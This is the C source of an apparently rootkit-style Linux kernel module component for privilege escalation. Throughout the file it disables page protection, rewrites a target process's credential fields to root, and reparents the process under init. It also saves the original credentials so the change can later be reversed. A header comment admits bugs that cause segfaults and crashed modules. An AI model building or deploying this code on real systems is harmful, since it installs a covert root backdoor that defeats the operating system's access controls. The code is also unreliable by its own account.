#include "utils.h"
#include "privilege_escalation.h"

/*
 * ########################################
 * #                                      #
 * #                 NOTE                 #
 * #                                      #
 * #    this file still has some heavy    #
 * #    bugs, leading to segfaults and    #
 * #    crashed modules. use these        #
 * #    functions with caution.           #
 * #                                      #
 * ########################################
 */

/* rwlock for accessing tasks creds */
rwlock_t cred_lock;
unsigned long cred_flags;

/*
 * since init_task in linux/sched.h has pid 0, we need to find the actual
 * init_task first (done via pid_task)
 */
struct task_struct *real_init;

/* list for saved creds */
struct data_node *creds = NULL;

/*
 * code explanation:
 * 
 * this code is adopted from the explanation of www.kernel.org, especcially
 * from the paragaph "ALTERING CREDENTIALS"
 *
 * source: https://www.kernel.org/doc/Documentation/security/credentials.txt
 */

/*
 * explanation and code adopted from www.informit.com, especially
 * from the paragraph "The Dilemma of the Parentless Task"
 *
 * http://www.informit.com/articles/article.aspx?p=368650&seqNum=4
 */
void init_task_adopt(struct task_struct *task, struct cred_node *node)
{
	node->parent = task->parent;
	node->real_parent = task->real_parent;

	write_lock_irqsave(&cred_lock, cred_flags);

	/* real_parent is now the init task */
	task->real_parent = real_init;

	/* adopting from kernel/exit.c */
	if(!task->ptrace)
		task->parent = real_init;

	/*
	 * current task was adopted by init, so he has new siblings
	 * we need to remove the task from his own siblings list and
	 * insert it to the init childrens siblings list
	 */
	list_move(&task->sibling, real_init->children.next);
	write_unlock_irqrestore(&cred_lock, cred_flags);
}

void init_task_disown(struct cred_node *node)
{
	write_lock_irqsave(&cred_lock, cred_flags);

	/* reversion of init_task_adopt */
	node->task->parent = node->parent;
	node->task->real_parent = node->real_parent;

	list_move(&node->task->sibling, node->parent->children.next);
	write_unlock_irqrestore(&cred_lock, cred_flags);
}

void insert_cred(struct task_struct *task)
{
	struct cred *pcred;

	/* create new node */
	struct cred_node *cnode = kmalloc(sizeof(struct cred_node), 
		GFP_KERNEL);

	debug("INSERT PROCESS %d CREDENTIALS", task->pid);

	cnode->pid = task->pid;
	cnode->task = task;

	disable_page_protection();
	rcu_read_lock();

	/* get process creds */
	pcred = (struct cred *)task->cred;

	/* backing up original values */
	cnode->uid = pcred->uid;
	cnode->euid = pcred->euid;
	cnode->suid = pcred->suid;
	cnode->fsuid = pcred->fsuid;
	cnode->gid = pcred->gid;
	cnode->egid = pcred->egid;
	cnode->sgid = pcred->sgid;
	cnode->fsgid = pcred->fsgid;

	/* escalate to root */
	pcred->uid.val = pcred->euid.val = 0;
	pcred->suid.val = pcred->fsuid.val = 0;
	pcred->gid.val = pcred->egid.val = 0;
	pcred->sgid.val = pcred->fsgid.val = 0;

	/* make process adopted by init */
	init_task_adopt(task, cnode);

	/* finished reading */
	rcu_read_unlock();
	enable_page_protection();

	debug("INSERT CREDENTIALS IN LIST");
	insert_data_node(&creds, (void *)cnode);
}

void remove_cred(struct data_node *node)
{
	struct cred *pcred;

	/* get node */
	struct cred_node *cnode = (struct cred_node *)node->data;

	debug("REMOVE CREDENTIALS FROM PROCESS %d", cnode->pid);
	disable_page_protection();
	rcu_read_lock();

	pcred = (struct cred *)cnode->task->cred;

	/* deescalate */
	pcred->uid = cnode->uid;
	pcred->euid = cnode->euid;
	pcred->suid = cnode->suid;
	pcred->fsuid = cnode->fsuid;
	pcred->gid = cnode->gid;
	pcred->egid = cnode->egid;
	pcred->sgid = cnode->sgid;
	pcred->fsgid = cnode->fsgid;

	/* make process child of its real parent again */
	init_task_disown(cnode);

	/* finished reading */
	rcu_read_unlock();
	enable_page_protection();
	debug("CLEAR CREDENTIAL NODE");
	kfree(cnode);
}

void process_escalate(int pid)
{
	struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);

	if(find_data_node_field(&creds, (void *)&pid, 
		offsetof(struct cred_node, pid), sizeof(pid)) == NULL 
		&& task != NULL) {
		debug("PROCESS %d NOT IN LIST, INSERT NEW CREDENTIAL", pid);
		insert_cred(task);
		return;
	}

	debug("PROCESS %d ALREADY IN LIST OR TASK NOT FOUND", pid);
}

void process_deescalate(int pid)
{
	struct data_node *node = find_data_node_field(&creds, (void *)&pid, 
		offsetof(struct cred_node, pid), sizeof(pid));

	if(node != NULL) {
		debug("PROCESS %d IN LIST, DELETE CREDENTIALS", pid);
		remove_cred(node);
		delete_data_node(&creds, node);
		return;
	}

	debug("PROCESS %d NOT IN LIST", pid);
}

int priv_escalation_init(void)
{
	debug("INITIALIZE PRIVILEGE EXCALATION");
	real_init = pid_task(find_get_pid(1), PIDTYPE_PID);
	return 0;
}

void priv_escalation_exit(void)
{
	debug("EXIT PRIVILEGE ESCALATION");
	free_data_node_list_callback(&creds, remove_cred);
}

MODULE_LICENSE("GPL");